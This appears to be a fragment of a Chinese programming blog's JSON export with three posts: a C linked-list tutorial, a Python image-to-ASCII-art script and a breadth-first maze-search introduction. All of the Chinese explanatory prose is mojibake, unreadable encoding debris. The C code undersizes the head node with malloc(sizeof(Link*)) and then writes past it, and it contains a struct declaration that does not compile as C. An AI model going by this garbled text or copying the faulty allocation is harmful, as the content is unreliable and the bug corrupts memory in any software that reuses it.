éœ€è¦æ³¨æ„çš„æ˜¯ï¼šfgets()å‡½æ•°åœ¨é‡åˆ°æ–‡ä»¶ç»“å°¾(EOF End Of File)æ—¶å°†ä¼šè¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆï¼› å…³äºstrchr()å‡½æ•°ï¼š åœ¨æŸä¸ªå­—ç¬¦æ•°ç»„ä¸­æŸ¥æ‰¾æŸå­—ç¬¦ï¼Œå¹¶è¿”å›æŒ‡å‘è¯¥å­—ç¬¦çš„æŒ‡é’ˆ rå¦‚æœå­—ç¬¦ä¸²ä¸­ä¸åŒ…å«è¯¥å­—ç¬¦ï¼Œåˆ™è¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆ ç»è¿‡é‡å†™ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š é¦–å…ˆä½¿ç”¨fgets()å‡½æ•°æ¥æ”¶è¾“å…¥ï¼Œå¹¶å°†è¿”å›å€¼å­˜å‚¨åœ¨æŒ‡é’ˆret_valä¸­ï¼Œç„¶åå¯¹è¯¥æŒ‡é’ˆè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ä¸ºç©ºæŒ‡é’ˆï¼Œåˆ™ä½¿ç”¨å­—ç¬¦æŸ¥æ‰¾å‡½æ•°æŸ¥æ‰¾æ¢è¡Œç¬¦ï¼Œå¹¶å°†è¯¥æ¢è¡Œç¬¦æ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼Œå¦‚æœæŸ¥æ‰¾æ¢è¡Œç¬¦å¤±è´¥ï¼Œè¯´æ˜è¾“å…¥çš„å­—ç¬¦æ•°é‡è¶…è¿‡äº†å­—ç¬¦æ•°ç»„çš„å¤§å°ï¼Œè¿™æ—¶ä½¿ç”¨ä¸€ä¸ªwhileå¾ªç¯æ¥æ”¶å…¶ä½™çš„è¾“å…¥å¹¶æŠ›å¼ƒï¼›å¦‚æœret_valä¸ºç©ºæŒ‡é’ˆï¼Œè¯´æ˜é‡åˆ°æ–‡ä»¶ç»“å°¾ï¼›æœ€åè¿”å›ret_valï¼› ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ä¸»å‡½æ•°è¿›è¡Œæµ‹è¯• 12345678910111213141516171819202122232425int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125; é¦–å…ˆå£°æ˜ä¸€ä¸ªå­—ç¬¦æ•°ç»„ç”¨æ¥å‚¨å­˜è¾“å…¥ï¼Œç„¶åå£°æ˜ä¸€ä¸ªèŠ‚ç‚¹ç±»å‹çš„æŒ‡é’ˆä½œä¸ºå¤´èŠ‚ç‚¹ï¼Œå¹¶ä¸ºå…¶åˆ†é…å†…å­˜ï¼Œæ¥ç€å†å£°æ˜ä¸€ä¸ªåŒæ ·çš„ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘è¯¥å¤´æŒ‡é’ˆï¼Œè¿™é‡Œä½¿ç”¨ä¸´æ—¶æŒ‡é’ˆçš„ç›®çš„æ˜¯ä½œä¸ºå½“å‰æŒ‡é’ˆä¸ä¸‹ä¸€ä¸ªæŒ‡é’ˆçš„è¿‡æ¸¡æŒ‡é’ˆï¼ŒåŒæ—¶ä¿æŒå¤´æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸å˜ï¼Œæ–¹ä¾¿æœ€åçš„è¾“å‡ºï¼› åœ¨è¾“å‡ºæç¤ºä¿¡æ¯ä¹‹åè¿›å…¥å¾ªç¯ï¼Œé€€å‡ºæ¡ä»¶ä¸ºè¾“å…¥ç©ºè¡Œï¼›åœ¨å¾ªç¯ä¸­ï¼Œé¦–å…ˆå£°æ˜æŒ‡å‘å½“å‰èŠ‚ç‚¹çš„æŒ‡é’ˆå¹¶ä¸ºå…¶åˆ†é…å†…å­˜ï¼Œæ¥ç€å°†è¯¥æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„ä¸­çš„æŒ‡é’ˆå£°æ˜ä¸ºNULLï¼Œç„¶åå°†å½“å‰èŠ‚ç‚¹çš„æŒ‡é’ˆèµ‹ç»™ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„çš„æŒ‡é’ˆï¼Œä½¿å…¶ä¸ä¸Šä¸€ä¸ªèŠ‚ç‚¹ç›¸è¿ï¼Œç„¶åå†å°†ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘çš„æŒ‡é’ˆèµ‹ç»™è‡ªèº«(å…¶å®å°±ç›¸å½“äºä½¿ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹)ï¼›æ¥ç€å°†åˆšåˆšæ¥æ”¶çš„è¾“å…¥å¤åˆ¶åˆ°å½“å‰èŠ‚ç‚¹çš„nameå˜é‡ä¸­ï¼Œç„¶åå†æ¥æ”¶ç¼–å·çš„è¾“å…¥å¹¶å­˜å‚¨åˆ°å½“å‰èŠ‚ç‚¹çš„numberå˜é‡ä¸­ï¼›å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨scanf()å‡½æ•°æ¥æ”¶è¾“å…¥åè¯¥å‡½æ•°ä¼¼ä¹ä¼šå°†æ¢è¡Œç¬¦ç•™åœ¨ç¼“å­˜åŒºä¸­ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨getchar()å‡½æ•°æ¥å°†è¯¥æ¢è¡Œç¬¦ä»ç¼“å­˜åŒºä¸­å»é™¤ï¼› åœ¨å¾ªç¯ç»“æŸä¹‹åï¼Œæˆ‘å°†ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘äº†å¤´èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹(è¯·æ³¨æ„ï¼Œå¤´èŠ‚ç‚¹ä¸­å¹¶æ²¡æœ‰å‚¨å­˜é™¤ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€ä¹‹å¤–çš„ä»»ä½•ä¿¡æ¯ï¼Œæ•…æ­¤å¤„ä»å¤´èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹å¼€å§‹)ï¼›ç„¶åè¿›å…¥ä¸‹ä¸€ä¸ªwhileå¾ªç¯ï¼Œé€€å‡ºæ¡ä»¶ä¸ºä¸´æ—¶æŒ‡é’ˆä¸ºç©ºæŒ‡é’ˆ(å› ä¸ºåœ¨ä¸Šä¸€ä¸ªwhileå¾ªç¯ä¸­å·²ç»å°†å½“å‰èŠ‚ç‚¹ä¸­çš„æŒ‡é’ˆå£°æ˜ä¸ºNULLäº†ï¼Œæ‰€ä»¥ä¸€æ—¦ç¬¬ä¸€ä¸ªå¾ªç¯ç»“æŸï¼Œæœ€åä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„æŒ‡é’ˆå¿…ä¸ºNULL)ï¼Œç„¶åæ‰“å°å‡ºå½“å‰èŠ‚ç‚¹çš„ä¿¡æ¯å¹¶å°†ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚ æºä»£ç  æœ€åé™„ä¸Šæºä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define MAX_INPUT 20char* s_gets(char* st, int n);char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125;typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link;int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"çŸ¥è¯†è¾“å‡º","slug":"çŸ¥è¯†è¾“å‡º","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"ç”¨Pythonç¼–å†™ä¸€ä¸ªèƒ½å°†å›¾ç‰‡è½¬æ¢ä¸ºå­—ç¬¦ç”»çš„ç¨‹åº","slug":"ç”¨Pythonç¼–å†™ä¸€ä¸ªèƒ½å°†å›¾ç‰‡è½¬æ¢ä¸ºå­—ç¬¦ç”»çš„ç¨‹åº","date":"2021-04-09T16:46:04.299Z","updated":"2020-11-10T02:54:55.042Z","comments":true,"path":"2021/04/10/ç”¨Pythonç¼–å†™ä¸€ä¸ªèƒ½å°†å›¾ç‰‡è½¬æ¢ä¸ºå­—ç¬¦ç”»çš„ç¨‹åº/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081\\# -*- coding=utf-8 -*- from PIL import Image import argparse #å‘½ä»¤è¡Œè¾“å…¥å‚æ•°å¤„ç† parser = argparse.ArgumentParser() parser.add_argument(&#x27;file&#x27;) #è¾“å…¥æ–‡ä»¶parser.add_argument(&#x27;-o&#x27;, &#x27;--output&#x27;) #è¾“å‡ºæ–‡ä»¶ parser.add_argument(&#x27;--width&#x27;, type = int, default = 80) #è¾“å‡ºå­—ç¬¦ç”»å®½ parser.add_argument(&#x27;--height&#x27;, type = int, default = 80) #è¾“å‡ºå­—ç¬¦ç”»é«˜ #è·å–å‚æ•° args = parser.parse_args() IMG = args.fileWIDTH = args.width HEIGHT = args.height OUTPUT = args.output ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\\&quot;^&#x27;. &quot;) # å°†256ç°åº¦æ˜ å°„åˆ°70ä¸ªå­—ç¬¦ä¸Š def get_char(r,g,b,alpha = 256): â€‹ if alpha == 0: â€‹ return &#x27; &#x27; â€‹ length = len(ascii_char) â€‹ gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) â€‹ unit = (256.0 + 1)/length â€‹ return ascii_char[int(gray/unit)] if __name__ == &#x27;__main__&#x27;: â€‹ im = Image.open(IMG) â€‹ im = im.resize((WIDTH,HEIGHT), Image.NEAREST) â€‹ txt = &quot;&quot; â€‹ for i in range(HEIGHT): â€‹ for j in range(WIDTH): â€‹ txt += get_char(*im.getpixel((j,i))) â€‹ txt += &#x27;\\n&#x27; â€‹ print(txt) #å­—ç¬¦ç”»è¾“å‡ºåˆ°æ–‡ä»¶ â€‹ if OUTPUT: â€‹ with open(OUTPUT,&#x27;w&#x27;) as f: â€‹ f.write(txt) â€‹ else: â€‹ with open(&quot;output.txt&quot;,&#x27;w&#x27;) as f: â€‹ f.write(txt)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"äººå·¥æ™ºèƒ½å…¥é—¨-æŸ¥æ‰¾","slug":"äººå·¥æ™ºèƒ½å…¥é—¨-æœç´¢","date":"2021-04-09T16:46:04.298Z","updated":"2021-05-02T06:00:22.634Z","comments":true,"path":"2021/04/10/äººå·¥æ™ºèƒ½å…¥é—¨-æœç´¢/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/","excerpt":"æ¦‚è¿° ä¼—æ‰€å‘¨çŸ¥ï¼Œäººå·¥æ™ºèƒ½åœ¨è¿‘äº›å¹´ååˆ†ç«çˆ†ï¼Œåœ¨å„ä¸ªé¢†åŸŸçš„åº”ç”¨ä¹Ÿæ˜¯ååˆ†å¹¿æ³›ï¼Œå…¶ä¸­ä¸€ä¸ªé¢†åŸŸå°±æ˜¯å¯¼èˆªã€‚","text":"æ¦‚è¿° ä¼—æ‰€å‘¨çŸ¥ï¼Œäººå·¥æ™ºèƒ½åœ¨è¿‘äº›å¹´ååˆ†ç«çˆ†ï¼Œåœ¨å„ä¸ªé¢†åŸŸçš„åº”ç”¨ä¹Ÿæ˜¯ååˆ†å¹¿æ³›ï¼Œå…¶ä¸­ä¸€ä¸ªé¢†åŸŸå°±æ˜¯å¯¼èˆªã€‚ ä¹Ÿè®¸æœ‰äººä¼šè¯´ï¼Œå¯¼èˆªä¸å°±æ˜¯ç”µå­åœ°å›¾å˜›ï¼Ÿå’Œäººå·¥æ™ºèƒ½æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿä½†å…¶å®åœ¨å¯¼èˆªä¸­äººå·¥æ™ºèƒ½å‘æŒ¥äº†å¾ˆé‡è¦çš„ä½œç”¨ã€‚â€œæ¡æ¡å¤§è·¯é€šç½—é©¬â€ï¼Œä¸ºä»€ä¹ˆå¯¼èˆªä¼šå‘ä½ æ¨èè¿™æ¡è·¯è€Œä¸æ¨èå¦ä¸€æ¡è·¯ï¼Ÿè¿™å…¶ä¸­å°±æ¶‰åŠåˆ°äº†äººå·¥æ™ºèƒ½ä¸­çš„æœç´¢ç®—æ³•ã€‚ åœ¨æœç´¢ä¸­ï¼Œå¾€å¾€æœ‰åˆå§‹çŠ¶æ€(initial states)ã€ç›®æ ‡çŠ¶æ€(goal states)ï¼Œè€Œäººå·¥æ™ºèƒ½æ‰€åšçš„ï¼Œå°±æ˜¯åœ¨ä¼—å¤šæƒ…å½¢ä¸­ï¼Œæ‰¾åˆ°ä¼—å¤šè§£å†³æ–¹æ³•çš„æœ€ä¼˜è§£ï¼Œå…¶ä¸­ä¼šæ¶‰åŠåˆ°å¾ªç¯å’Œè¿­ä»£ï¼Œå‡å¦‚æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªåˆå§‹çŠ¶æ€ï¼Œæˆ‘ä»¬è¦æ€æ ·è¾¾åˆ°ç›®æ ‡çŠ¶æ€å‘¢ï¼Ÿ æ¦‚å¿µä»‹ç» åœ¨è¿™ä¹‹å‰éœ€è¦å…ˆäº†è§£ä¸€äº›æ¦‚å¿µï¼š åŠ¨ä½œï¼šé€šå¸¸æ˜¯æ¥å—çŠ¶æ€çš„å‡½æ•°ï¼Œè¿”å›åœ¨æ­¤çŠ¶æ€ä¸­åº”è¯¥åšå‡ºçš„å†³ç­– è¿ç§»æ¨¡å‹ï¼šé€šå¸¸æ˜¯æ¥å—çŠ¶æ€å’ŒåŠ¨ä½œçš„å‡½æ•°ï¼Œè¿”å›åœ¨æ­¤çŠ¶æ€ä¸‹åšå‡ºæ­¤ç§å†³ç­–åçš„æ–°çŠ¶æ€ èŠ‚ç‚¹ï¼šæ•°æ®ç»“æ„ï¼Œç”¨æ¥è®°å½•çŠ¶æ€ï¼Œçˆ¶èŠ‚ç‚¹ï¼ŒåŠ¨ä½œå’Œè·¯å¾„æˆæœ¬ è¾¹ç•Œï¼šæ•°æ®ç»“æ„ï¼Œç”¨æ¥åŒºåˆ†å·²æ¢ç´¢çš„éƒ¨åˆ†å’Œæœªæ¢ç´¢çš„éƒ¨åˆ† ç®—æ³•è®¨è®º åœ¨äº†è§£äº†ç›¸å…³æ¦‚å¿µä¹‹åï¼Œæˆ‘ä»¬å¼€å§‹è®¨è®ºç®—æ³•ï¼š é¦–å…ˆå°†åˆå§‹çŠ¶æ€æ”¾å…¥è¾¹ç•Œï¼Œç„¶åè¿›å…¥å¾ªç¯ å¦‚æœè¾¹ç•Œä¸ºç©ºï¼Œåˆ™æ— è§£ ä»è¾¹ç•Œä¸­ç§»å»ä¸€ä¸ªèŠ‚ç‚¹ å¦‚æœæ­¤èŠ‚ç‚¹åŒ…å«ç›®æ ‡çŠ¶æ€ï¼Œåˆ™è¿½è¸ªçˆ¶èŠ‚ç‚¹ï¼Œç„¶åè¿”å›è§£å†³æ–¹æ¡ˆ æ‰©å¼ èŠ‚ç‚¹å¹¶å°†å…¶åŠ å…¥è¾¹ç•Œ ä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š å‡è®¾æˆ‘ä»¬ç°åœ¨çš„è¦æ±‚æ˜¯æ‰¾åˆ°ä»Aåˆ°Eçš„è·¯å¾„ ç¬¬ä¸€æ­¥æˆ‘ä»¬å°†Aï¼ˆåˆå§‹çŠ¶æ€ï¼‰æ”¾å…¥è¾¹ç•Œï¼Œè¿›å…¥å¾ªç¯ å› ä¸ºAä¸æ˜¯ç›®æ ‡çŠ¶æ€ï¼Œå°†Aç§»å‡ºè¾¹ç•Œå¹¶å°†BåŠ å…¥è¾¹ç•Œ å› ä¸ºBä¸æ˜¯ç›®æ ‡çŠ¶æ€ï¼Œå°†Bç§»å‡ºè¾¹ç•Œå¹¶å°†Cå’ŒDåŠ å…¥è¾¹ç•Œ å› ä¸ºCä¸æ˜¯ç›®æ ‡çŠ¶æ€ï¼Œå°†Cç§»å‡ºè¾¹ç•Œå¹¶å°†EåŠ å…¥è¾¹ç•Œ å› ä¸ºEæ˜¯ç›®æ ‡çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿”å›ä»Aåˆ°Eçš„è·¯å¾„ï¼Œå¾ªç¯ç»“æŸ è‡³æ­¤ï¼Œæˆ‘ä»¬å°±è§£å†³äº†ä¸€ä¸ªéå¸¸ç®€å•çš„è·¯å¾„æœç´¢é—®é¢˜ï¼Œå½“ç„¶ï¼Œè¿™ä¸ªç®—æ³•è¿˜å­˜åœ¨ç€è®¸å¤šé—®é¢˜ï¼Œæ¯”å¦‚ï¼šå¦‚ä½•ç¡®ä¿ç®—æ³•ä¸ä¼šé‡æ–°æ£€æŸ¥å½“å‰çŠ¶æ€çš„çˆ¶èŠ‚ç‚¹ï¼Ÿå¦‚æœé‡å¤æ£€æŸ¥çˆ¶èŠ‚ç‚¹ï¼Œé‚£ä¹ˆç¨‹åºå°†è¿›å…¥æ— é™æ­»å¾ªç¯ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œä½¿ç”¨ä¸€ä¸ªæ•°æ®ç»“æ„æ¥å‚¨å­˜å·²æ£€æŸ¥è¿‡çš„èŠ‚ç‚¹ï¼Œç„¶ååœ¨æ¯æ¬¡æ£€æŸ¥èŠ‚ç‚¹æ—¶éå†æ­¤æ•°æ®ç»“æ„ï¼Œå¦‚æœå­˜åœ¨ä¸ä¹‹ç›¸åŒçš„èŠ‚ç‚¹åˆ™ä¸æ£€æŸ¥ã€‚ é‚£ä¹ˆåœ¨å®é™…æƒ…å†µä¸‹æ˜¯æ€ä¹ˆæ ·çš„å‘¢ï¼Ÿ å®æˆ˜ ä¸‹é¢è¿›å…¥å®æˆ˜ç¯èŠ‚ï¼š æƒ…å¢ƒï¼šä½ ç°åœ¨æœ‰ä¸€å¼ è¿·å®«åœ°å›¾ï¼Œèµ·ç‚¹ä¸ºAï¼Œç»ˆç‚¹ä¸ºBï¼Œéœ€è¦ç¼–å†™ç¨‹åºä»¤è®¡ç®—æœºè‡ªè¡Œæ‰¾å‡ºç¦»å¼€è¿·å®«çš„è·¯å¹¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Š 12345678910111213141516171819# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # æˆ‘ä»¬å°†è¿™ä¸ªå¾…å®ç°çš„ç¨‹åºæŒ‰ç…§ä¹‹å‰æ‰€è®¨è®ºçš„åˆ†ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼š å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ä¸»è¦å°†ç¨‹åºåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š é¦–å…ˆæ˜¯å®šä¹‰ç›¸å…³çš„å˜é‡ï¼Œå¹¶ä¸”å°†åˆå§‹çŠ¶æ€æ”¾å…¥è¾¹ç•Œï¼› ç„¶åè¿›å…¥å¾ªç¯ï¼š ç¬¬ä¸€æ­¥ï¼šæ£€æŸ¥è¾¹ç•Œçš„é•¿åº¦ï¼Œå¦‚æœç­‰äº0åˆ™è¯´æ˜æ— è§£ ç¬¬äºŒæ­¥ï¼šä»è¾¹ç•Œä¸­ç§»å»ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å°†æ­¤èŠ‚ç‚¹æ·»åŠ åˆ°è¡¨ç¤ºå·²æ¢ç´¢çš„æ•°æ®ç»“æ„ ç¬¬ä¸‰æ­¥ï¼šæ£€æŸ¥è¢«ç§»å»çš„èŠ‚ç‚¹ï¼Œå¦‚æœæ­¤èŠ‚ç‚¹åŒ…å«ç›®æ ‡çŠ¶æ€ï¼Œåˆ™è¿½è¸ªå…¶çˆ¶èŠ‚ç‚¹ï¼Œå¹¶è¿”å›è·¯å¾„ æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå¾ªç¯æ¥è¿½è¸ªå®Œæ•´çš„è·¯å¾„ï¼Œå¹¶å°†å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚ ä»¥ä¸‹æ˜¯æ ¹æ®æ€è·¯å®ç°çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapfor i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = trace for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;) break for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y))) current = frontier[0] travel(map1,start) åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼š ç”±äºå¯¹Pythonä¸­ç±»çš„ä½¿ç”¨ä¸ç†Ÿç»ƒï¼Œå¯¼è‡´ä»£ç ä¸­æœ‰å…³éƒ¨åˆ†çœ‹èµ·æ¥å¾ˆå¥‡æ€ª åœ¨éå†å½“å‰èŠ‚ç‚¹å‘¨å›´çš„æœ‰æ•ˆèŠ‚ç‚¹æ—¶ï¼Œæ²¡æœ‰é‡æ–°åˆå§‹åŒ–èŠ‚ç‚¹ï¼Œè€Œæ˜¯ç›´æ¥å°†å½“å‰èŠ‚ç‚¹å‘¨å›´æœ‰æ•ˆèŠ‚ç‚¹çš„åæ ‡åŠ å…¥è¾¹ç•Œï¼Œå¯¼è‡´å¾ªç¯ä»ç¬¬äºŒæ¬¡å¼€å§‹å°±æ— æ³•è¿›è¡Œï¼Œå› ä¸ºåæ ‡æ²¡æœ‰â€œå‘¨å›´çš„æœ‰æ•ˆèŠ‚ç‚¹â€è¿™ä¸ªå±æ€§ åœ¨å°†ä»¥æ¢ç´¢è¿‡çš„èŠ‚ç‚¹åŠ å…¥å¯¹åº”æ•°æ®ç»“æ„åï¼Œæ£€æŸ¥ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦åœ¨æ­¤æ•°æ®ç»“æ„æ—¶ç›´æ¥ä½¿ç”¨â€œ==â€ï¼Œä½†æ˜¯å³ä½¿åæ ‡ç›¸åŒçš„ä¸¤ä¸ªèŠ‚ç‚¹ä¹Ÿå¯èƒ½ä¸ç›¸ç­‰ï¼ŒåŸå› æ˜¯è¿™ä¸¤ä¸ªèŠ‚ç‚¹å­˜åœ¨äºä¸åŒçš„åœ°å€ï¼Œæ­£ç¡®çš„åšæ³•æ˜¯å†éå†ä¸€éå­˜å‚¨ä»¥æ¢ç´¢è¿‡çš„æ•°æ®ç»“æ„ï¼Œç›´æ¥æ¯”è¾ƒæ­¤æ•°æ®ç»“æ„ä¸­èŠ‚ç‚¹çš„åæ ‡å€¼ åœ¨å®Œæˆåˆæ­¥çš„å®ç°åï¼Œå¤„äºå¯¹ä»£ç é‡æ„çš„è¦æ±‚ï¼Œå¯¹ä»£ç åšäº†ç›¸å…³çš„å‡½æ•°å°è£…ï¼š 